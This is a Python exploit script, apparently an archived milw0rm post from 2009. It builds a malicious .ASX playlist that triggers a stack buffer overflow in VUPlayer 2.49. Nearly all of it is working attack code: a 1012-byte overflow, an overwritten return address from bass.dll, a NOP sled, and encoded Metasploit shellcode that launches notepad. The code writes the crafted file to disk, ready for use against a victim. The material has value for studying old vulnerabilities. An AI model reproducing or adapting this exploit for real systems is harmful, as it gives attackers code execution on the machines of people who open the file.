#usage: exploit.py
print "**************************************************************************"
print " VUPlayer 2.49 .ASX File (HREF) Universal Buffer Overflow\n"
print " Founder: aBo MoHaMeD"
print " exploit code: His0k4"
print " Tested on: Windows XP Pro SP2 Fr\n"
print " Greetings to:"
print " All friends & muslims HaCkers(dz)\n"
print "**************************************************************************"
         	

header1 = (
			"\x3C\x41\x53\x58\x20\x56\x45\x52\x53\x49\x4F\x4E\x3D\x22\x33"
		    	"\x2E\x30\x22\x3E\x0A\x0A\x3C\x45\x4E\x54\x52\x59\x3E\x3C\x54"
			"\x49\x54\x4C\x45\x3E\x65\x78\x70\x6C\x6F\x69\x74\x3C\x2F\x54"
			"\x49\x54\x4C\x45\x3E\x0A\x3C\x52\x45\x46\x20\x48\x52\x45\x46"
			"\x3D\x22"
			)

header2 = (
			"\x2E\x61\x73\x66\x22\x2F\x3E\x0A\x3C\x2F\x45\x4E\x54\x52\x59"
			"\x3E\x3C\x2F\x41\x53\x58\x3E"
		   )
			
buff = "\x41" * 1012

EIP = "\xDF\x18\x02\x10" #universal address from bass.dll


nop = "\x90" * 19

# win32_exec -  EXITFUNC=seh CMD=notepad Size=349 Encoder=PexAlphaNum http://metasploit.com
shellcode = (
	"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
	"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
	"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
	"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
	"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
	"\x42\x30\x42\x30\x42\x50\x4b\x58\x45\x54\x4e\x33\x4b\x58\x4e\x37"
	"\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x54\x4a\x51\x4b\x58"
	"\x4f\x35\x42\x42\x41\x50\x4b\x4e\x49\x54\x4b\x58\x46\x33\x4b\x48"
	"\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
	"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
	"\x46\x4f\x4b\x43\x46\x35\x46\x52\x46\x30\x45\x37\x45\x4e\x4b\x38"
	"\x4f\x35\x46\x52\x41\x50\x4b\x4e\x48\x56\x4b\x38\x4e\x50\x4b\x44"
	"\x4b\x48\x4f\x45\x4e\x41\x41\x50\x4b\x4e\x4b\x48\x4e\x31\x4b\x48"
	"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x43"
	"\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x43\x45\x38\x42\x4c\x4a\x57"
	"\x4e\x50\x4b\x58\x42\x34\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a"
	"\x4b\x48\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x48\x42\x4b"
	"\x42\x50\x42\x30\x42\x30\x4b\x38\x4a\x46\x4e\x53\x4f\x55\x41\x43"
	"\x48\x4f\x42\x36\x48\x45\x49\x38\x4a\x4f\x43\x38\x42\x4c\x4b\x47"
	"\x42\x45\x4a\x56\x42\x4f\x4c\x38\x46\x30\x4f\x45\x4a\x56\x4a\x49"
	"\x50\x4f\x4c\x38\x50\x50\x47\x45\x4f\x4f\x47\x4e\x50\x56\x4f\x36"
	"\x46\x47\x45\x46\x42\x37\x41\x46\x46\x46\x42\x30\x5a"
    )

exploit = header1 + buff + EIP + nop + shellcode + header2

try:
    out_file = open("exploit.asx",'w')
    out_file.write(exploit)
    out_file.close()
    raw_input("\nExploit file created!\n")
except:
    print "Error"

# milw0rm.com [2009-01-11]